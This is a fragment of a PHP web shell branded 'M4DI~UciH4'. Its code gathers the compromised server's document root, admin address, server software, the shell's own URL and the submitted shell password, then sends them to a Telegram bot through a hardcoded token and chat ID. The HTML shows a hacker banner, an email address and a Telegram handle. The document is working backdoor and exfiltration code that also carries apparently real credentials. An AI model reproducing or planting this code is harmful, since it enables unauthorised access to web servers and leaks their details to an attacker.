...
{
function Requirements($haxx, $x0r = "5441940388:AAGMwLVf99E87OMVr4RQ9IXOGkohds5KQn0", $ganz = "1975187896")
    {
        if (function_exists('curl_version')) {
            $curl = curl_init();
            curl_setopt_array($curl, array(CURLOPT_URL => "https://api.telegram.org/bot" . $x0r . "/sendMessage?chat_id=" . $ganz . "&text=" . urlencode($haxx) . "", CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_ENCODING => "", CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 30, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => "GET"));
            curl_exec($curl);
        } else {
            $ggg = "https://api.telegram.org/bot" . $x0r . "/sendMessage?chat_id=" . $ganz . "&text=" . urlencode($haxx) . "";
            file_get_contents($ggg, true);
        }
    }
    $canz = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $c = "Path File : " . $_SERVER['DOCUMENT_ROOT'] . "\r\n";
    $c .= "Server Admin : " . $_SERVER['SERVER_ADMIN'] . "\r\n";
    $c .= "Jenis Server : " . $_SERVER['SERVER_SOFTWARE'] . "\r\n";
    $c .= "Shell Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\r\n";
    $pass2 = $_POST['pass'];
    $c .= "Alamat Website : " . $_SERVER['HTTP_HOST'] . "\r\n";
    Requirements("$c PasswordShell = $pass2");
    Requirements($canz);
    }
?> 
<!DOCTYPE html>
...
<link rel="icon" href="https://i.top4top.io/p_2580bkcoz0.png">
...
<a href="mailto:susi.siy99@gmail.com" class="fa fa-envelope border"></a>
<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #ff0000;"><span>M4DI~UciH4</span></a>
<a href="https://t.me/madihengker" class="fa fa-telegram border"></a> 
</div>
...
<font style="color: #ff0000;">M4DI~UciH4</font>
</h5>
<?php mR: ?> 
</div>
